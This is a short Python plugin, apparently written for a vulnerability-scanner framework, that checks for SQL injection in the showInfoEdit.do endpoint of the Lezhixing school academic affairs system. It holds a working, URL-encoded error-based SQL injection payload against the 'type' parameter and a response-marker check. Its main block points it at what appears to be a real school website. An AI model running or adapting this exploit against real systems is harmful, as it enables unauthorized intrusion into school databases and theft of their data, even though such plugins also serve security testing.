#!/usr/bin/env python
# -*- coding: utf-8 -*
# 乐知行教务系统showInfoEdit.do SQL注入 
import re

def assign(service, arg):
    if service == 'lezhixing_datacenter':
        return True, arg
        
def audit(arg):
    payload = "datacenter/downloadApp/showInfoEdit.do?_1428145745205&id=dc5593e2e6dd4d2fa4c1651aa2202c99&time=1428145745185&type=%27%20AND%20%28SELECT%206347%20FROM%28SELECT%20COUNT%28*%29,CONCAT%280x71626b6a71,%28SELECT%20%28ELT%286347=6347,1%29%29%29,0x71707a7871,FLOOR%28RAND%280%29*2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27GfKZ%27=%27GfKZ&_app_encoding_tag_=1"
    code,head,res,_,_ = curl.curl2(arg+payload)
    if 'qbkjq1qpzxq1' in res :
    	security_hole(arg+payload)
if __name__ == '__main__':
    from dummy import *
    audit(assign('lezhixing_datacenter','http://www.dxyzzx.com/')[1])